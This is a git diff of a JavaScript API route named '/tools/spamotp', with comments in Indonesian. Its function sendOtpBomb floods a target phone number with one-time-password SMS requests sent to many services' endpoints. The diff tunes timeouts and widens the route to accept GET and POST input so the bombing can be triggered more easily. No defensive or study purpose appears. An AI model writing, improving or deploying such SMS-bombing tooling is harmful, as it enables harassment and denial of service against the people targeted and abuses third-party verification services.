@@ -1,4 +1,4 @@
-const axios = require('axios');
+        const axios = require('axios');
 
 async function sendOtpBomb(phone) {
     if (phone.startsWith("0")) phone = "62" + phone.slice(1);
@@ -38,8 +38,8 @@ async function sendOtpBomb(phone) {
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 
                     ...(ep.headers || {}) 
                 },
-                timeout: 5000,
-                validateStatus: () => true // Mencegah Axios crash/throw error jika API target mengembalikan status 404/500
+                timeout: 4000,
+                validateStatus: () => true 
             };
             
             let res;
@@ -49,8 +49,7 @@ async function sendOtpBomb(phone) {
                 res = await axios.post(ep.url, ep.data, config);
             }
 
-            // Anggap sukses jika server merespon dengan status sukses (200-299)
-            if (res.status >= 200 && res.status < 300) {
+            if (res && res.status >= 200 && res.status < 300) {
                 success++;
             } else {
                 failed++;
@@ -69,21 +68,22 @@ async function sendOtpBomb(phone) {
 }
 
 module.exports = {
-    method: 'post',
+    // Diubah ke 'all' agar mendukung request GET (lewat browser) dan POST (lewat bot/fetch)
+    method: 'all', 
     path: '/tools/spamotp',
     isApikey: true,
     handler: async (req, res) => {
         try {
-            // Mengambil input dari body (khas POST) maupun query (khas GET) agar fleksibel dan tidak eror 404
-            const phone = req.body?.phone || req.query?.phone;
-            const q = req.body?.q || req.query?.q;
+            // Mengambil data dari segala jenis input request
+            const phone = req.query?.phone || req.body?.phone;
+            const q = req.query?.q || req.body?.q;
             const input = phone || q;
 
             if (!input) {
                 return res.status(400).json({
                     status: false,
                     creator: 'Rin imup',
-                    message: 'nomor diperlukan! contoh parameter body/query: phone=08123456789'
+                    message: 'nomor diperlukan! contoh: ?phone=08123456789'
                 });
             }
 
@@ -92,13 +92,13 @@ module.exports = {
                 return res.status(400).json({
                     status: false,
                     creator: 'Rin imup',
-                    message: 'Nomor HP tidak valid. Pastikan nomor benar dan hanya berisi angka.'
+                    message: 'Nomor HP tidak valid. Pastikan hanya berisi angka minimal 9 digit.'
                 });
             }
 
             const result = await sendOtpBomb(cleanPhone);
 
-            const responseData = {
+            res.json({
                 status: true,
                 creator: 'Rin imup',
                 data: {
@@ -108,9 +108,7 @@ module.exports = {
                     failed: result.failed,
                     message: 'Proses pengiriman OTP selesai dilakukan'
                 }
-            };
-
-            res.json(responseData);
+            });
         } catch (err) {
             res.status(500).json({
                 status: false,
@@ -126,9 +124,9 @@ module.exports = {
         parameters: [
             {
                 name: "phone",
-                in: "body",
+                in: "query",
                 required: true,
-                description: "Nomor HP Target (contoh: 0812xxxxxxxx)"
+                description: "Nomor HP Target"
             }
         ]
     }
